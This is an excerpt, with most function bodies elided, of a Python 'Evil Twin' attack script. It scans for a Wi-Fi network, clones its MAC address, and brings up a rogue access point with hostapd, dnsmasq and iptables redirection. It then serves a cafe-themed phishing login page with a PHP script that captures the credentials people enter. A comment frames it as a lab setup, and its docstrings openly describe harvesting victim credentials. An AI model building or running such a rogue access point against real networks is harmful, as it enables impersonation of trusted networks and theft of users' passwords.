...
# Modify these values to match your laboratory setup
PHY_INTERFACE = "wlan0" # Physical interface name (usually wlan0)
FAKE_IP = "10.0.0.1" # IP address for fake IP
DHCP_RANGE = "10.0.0.10,10.0.0.50,12h" # DHCP pool range
SCAN_PREFIX = "target_scan" 

""" 
Main controller class for impersonation of AP and phishing phases
of the Evil Twin attack implementation.
It creates a rogue AP with captive portal to harvest victim credentials.
"""
class FakeAP:
    def __init__(self):
		""" 
		Initializes FakeAP with default values for target and interfaces.
		"""
    ...
    def check_root(self):
		"""
		Checks if script is running with root privileges.
		Exit if not.
		"""
        if os.geteuid() != 0:
    ...
    def check_tools(self):
		"""
		Verifies for the installation of all required tools.
		Exits if any tool is missing.
		"""
    ...
    def start_monitor_mode(self):
		...
		Kills all interfering process to start monitor mode.
		"""
        print("[*] Enabling Monitor Mode for scanning...")
        subprocess.run(["airmon-ng", "check", "kill"], stdout=subprocess.DEVNULL)
        
        # Start airmon-ng and putting interface into monitor mode
    ...
    def should_mac_spoof(self):  
        """
		Ask user if they want to spoof MAC address to match target BSSID.
    ...
    def spoof_mac(self, target_bssid):
        """
		Clone the target AP's MAC address to make rogue AP appear more legitimate.

		Args:
			target_bssid: MAC address to clone
		"""
    ...
    def scan_for_targets(self):
		"""
		Scan for available wireless networks via airodump-ng
		Scan lasts 10 secodns and results are saved to CSV file.
		"""
        # Cleanup old scans
    ...
    def select_target(self):
		"""
		Parse scan results and ask user to select target network.
		Return True if target is successfully selected, False otherwise.
		"""
        ...
        with open(latest_csv, newline='', encoding='utf-8', errors='ignore') as f:
            ...
            for row in reader:
                ...
                ssid = row[13].strip()
                if not ssid: continue # Skip hidden networks
    ...
    def stop_monitor_mode(self):
        """
		Stop monitor mode to free the wireless card for hostapd.
    ...
    def create_configs(self):
		"""
		Generate hostapd configuration file for the fake AP.
		"""
...
"""
    ...
    def setup_networking(self):
		"""
		Configure network settings for fake AP.
		Sets IP address and enables IF forwardning.
		"""
    ...
    def start_services(self):
		"""
		Start all servies required for the fake AP
			1. Web server (lighttpd) for the captive portal
			2. DNS server (dnsmasq) for DHCP and DNS
			3. Access point (hostapd) for wireless network
		"""
...
"""
		...
		# Start DNSMasq in foreground with debugging
        ...
        # Start hostapd with output to console for real-time monitoring
        ...
        try:
            self.hostapd_proc.wait() # Waits for hostapd to exit
        except KeyboardInterrupt:
            pass  

    def cleanup(self):
		"""
		Clean up function to stop services, remove configurations and reset system state.
		Called on exit (normal or error)
		"""
        print("\n[*] Shutting down...")
    ...
    def set_captive_portal(self):
		"""
		Sets up captive portal with phishing page.
		Installs web server, creates HTML login page and PHP capture script for harvesting credentials.
		Uses a modifed café template from w3schools : https://www.w3schools.com/w3css/tryit.asp?filename=tryw3css_templates_cafe
		The images were taken from the internet without any lisense. Earlier version has the links to them.
		"""
		...
		# Create HTML login page with cafe theme
...
<body>
        ...
        <div class="login-container">
            <div class="login-card">
                ...
                <div class="login-header">
                    ...
                    <h1 class="login-title">Welcome to The Cafe</h1>
                    <p class="login-subtitle">Sign in to reserve tables and order online!</p>
                </div>
                ...
                <form class="login-form" id="loginForm" action="/login.php" method="POST" novalidate>
                    <div class="login-field">
                        ...
                        <span class="login-error" id="emailError"></span>
                    </div>
                    ...
                    <div class="login-field">
                        <div class="field-container">
                            ...
                            <button type="button" class="login-toggle" id="passwordToggle" aria-label="Toggle password visibility">
                ...
                <div class="login-signup">
                    ...
                    <a href="#" class="login-link signup-link" onclick="showSignup()">Sign up</a>
                </div>

                <div class="login-success" id="successMessage" style="display: none;">
    ...
    <script>
		...
		# Create PHP script to capture credentials
        php_capture = """<?php
        session_start();
	...
	# Create success page for after credential submission
...
<body>
    ...
    def setup_iptables(self):
		"""
		Configure iptables rules for:
		1. NAT masquerading for internet sharing
		2. Port forwarding for HTTP/HTTPS to captive portal
		3. Traffic forwarding between interfaces
		"""
		...
		# Setup NAT masquerading for internet access through eth0
    ...
    def run(self):
		"""
		Main execution flow for the attack.
		Puts all steps in the correct order.
		"""
        ...
        try:
			...
			# Regenerate hostapd config with correct SSID
            print("[*] Generating hostapd config...")
...
"""
			...
			# Setup networking rules and start services
            self.setup_iptables()
            self.start_services()
            ...
            self.cleanup() # Clean up to restore system state

if __name__ == "__main__":
	"""
	Entry point for the script.
	Creates FakeAP instance and runs the attack.
	"""
    FakeAP().run()
